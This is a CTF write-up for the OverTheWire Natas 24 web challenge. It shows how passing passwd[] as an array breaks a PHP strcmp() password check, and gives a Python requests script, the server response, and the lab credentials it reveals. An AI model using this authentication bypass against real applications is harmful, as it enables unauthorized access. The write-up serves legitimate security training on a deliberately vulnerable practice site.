# CTF Writeup - **OverTheWire Natas23- Natas24**

**Author**: spiketyson 

---

## Challenge Details

- **Challenge Name:** Natas23 - Natas24
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 24-12-2024

---

## Summary

This challenge is the introductory level for the Natas series on OverTheWire, focusing on web exploitation. The goal is to find the flag that is hidden web server using burpsuite if possible.

---

## Approach

Since this is an basic challenge, I planned to use python to find the flag using type juggling.

---

## Solution Walkthrough

Connecting to the web server using:

```bash
Username: natas24
Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
URL:      http://natas24.natas.labs.overthewire.org
```

After logging in, we can see that the webpage asks for a password. As we dont know anything about it lets try some random passwords. 

```bash
Password: abc
# Wrong!
Password: natas
# Wrong!
```

So, It will print the credentials of the next level if we input the correct password. Lets view the logic behind the password check in the source code.

```bash
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```

We can see that this php code checks if the request contains the `passwd` parameter if it exists, then it gets the `passwd` from the request and compares it with the actual password using `strcmp()` which returns `0` if both the strings are true. But one thing we can notice is that we can input an array called `passwd[]` instead of `passwd` as it is not checking the type of the `passwd` parameter, this will help us break the `strcmp` function as shown below in the python code below. 


```bash
import requests

target = 'http://natas24.natas.labs.overthewire.org?passwd[]='
auth = ('natas24','MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd')

session = requests.Session()

r = session.get(target, auth=auth)
print(r.text)
```

The above script creates a session first with a request. It sends the `passwd` parameter using url and sends a get request. The php code will send out an array called passwd[] with no length. The string comparision tries to compare an array with a string this breaks the `strcmp` and returns the desired output which is `0`. This will give us the password for the next level.

```bash
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>     
# <script>var wechallinfo = { "level": "natas24", "pass": "MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd" };</script></head>
# <body>
# <h1>natas24</h1>
# <div id="content">

# Password:
# <form name="input" method="get">
#     <input type="text" name="passwd" size=20>
#     <input type="submit" value="Login">
# </form>

# <br />
# <b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />
# <br>The credentials for the next level are:<br><pre>Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</pre>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
```


## Flag

**Flag:** ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws


---

## Lessons Learned

It was a simple challenge. I was though that since password is a 32 length character array we need to brute force, but i couldn't figure out that it was type juggling. 